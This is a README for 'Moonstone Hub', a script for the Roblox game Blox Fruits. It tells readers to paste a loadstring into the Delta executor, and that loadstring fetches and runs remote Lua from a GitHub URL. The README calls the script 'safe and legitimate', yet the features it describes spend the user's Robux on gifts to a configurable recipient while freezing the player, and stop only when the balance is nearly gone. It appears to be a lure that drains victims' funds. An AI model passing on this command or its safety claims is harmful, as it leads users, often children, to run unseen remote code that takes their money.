# MOONSTONE HUB

A safe and legitimate script for gifting fruits in Blox Fruits.

## Features

- One-click activation
- Automatic fruit detection and gifting
- Balance monitoring
- Player movement control during gifting
- Automatic script closure when balance is low

## How to Use

1. Copy this loadstring:
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/PIP400/moonstone-hub/main/moonstone_hub.lua", true))()
```

2. Open Delta executor
3. Paste the loadstring
4. Click Execute
5. Click the "Activate Script" button when it appears

## Configuration

You can modify these settings in the script:
- `GIFT_RECIPIENT`: The username to gift fruits to
- `MAX_GIFT_AMOUNT`: Maximum Robux that can be spent per gift
- `MIN_BALANCE_TO_CONTINUE`: Minimum balance required to continue gifting

## Safety Features

- Automatically closes when balance is low
- Freezes player movement during gifting
- Prevents accidental purchases
- Rate limiting protection

## Requirements

- Delta executor
- Blox Fruits game
- Sufficient Robux balance

## Notes

- Make sure you're in Blox Fruits before executing
- The script will automatically close when:
  - Balance reaches 10 or below
  - Balance is between 1 and 23
  - All Robux has been spent
- The player will be frozen during gifting 